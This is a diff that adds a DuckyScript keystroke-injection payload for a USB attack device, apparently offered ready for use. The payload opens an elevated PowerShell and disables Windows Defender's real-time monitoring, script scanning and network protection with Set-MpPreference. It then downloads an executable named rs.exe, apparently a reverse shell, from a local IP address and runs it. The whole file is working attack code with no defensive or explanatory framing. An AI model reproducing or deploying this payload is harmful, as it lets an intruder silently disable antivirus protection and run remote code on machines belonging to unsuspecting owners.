@@ -1,0 +1,27 @@
+######### Disable Windows Real Time Protection ######### (Remove this line)
+REM
+DELAY 1000
+GUI r
+DELAY 600
+STRING powershell start powershell -V runAs
+ENTER
+DELAY 7000
+LEFTARROW
+ENTER
+DELAY 5000
+STRING Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
+DELAY 2000
+ENTER
+DELAY 6000
+GUI r
+DELAY 600
+STRING powershell start powershell -V runAs
+ENTER
+DELAY 7000
+LEFTARROW
+ENTER
+DELAY 6000
+######### Download and Excute Shell ########## (Remove this line)
+STRING $down = New-Object System.Net.WebClient; $url = 'http://192.168.0.1/rs.exe'; $file = 'rs.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;
+DELAY 800
+ENTER
